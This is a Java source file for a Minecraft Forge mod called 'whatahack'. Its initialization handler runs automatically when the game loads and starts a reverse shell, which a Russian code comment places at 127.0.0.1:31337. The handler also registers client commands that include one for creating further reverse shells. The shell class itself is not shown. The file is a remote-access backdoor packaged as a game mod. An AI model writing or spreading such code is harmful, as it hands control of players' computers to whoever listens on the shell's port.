package org.pyfffe.whatahack;

import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.Mod.EventHandler;
import cpw.mods.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.client.ClientCommandHandler;

@Mod(modid = InitialMod.MODID, version = InitialMod.VERSION)
public class InitialMod {
    public static final String MODID = "whatahack";
    public static final String VERSION = "0.1";

    // Выполняется при загрузке игры
    @EventHandler
    public void init(FMLInitializationEvent event) {
        // Встроенный реверс шелл на 127.0.0.1:31337
        ReverseShell p = new ReverseShell();
        p.start();

        System.out.println("WhatAHack> Hacker Mode ENABLED");
        ClientCommandHandler.instance.registerCommand(new CommandUtils.TestPing());
        ClientCommandHandler.instance.registerCommand(new CommandUtils.CreateReverseShell());
    }

}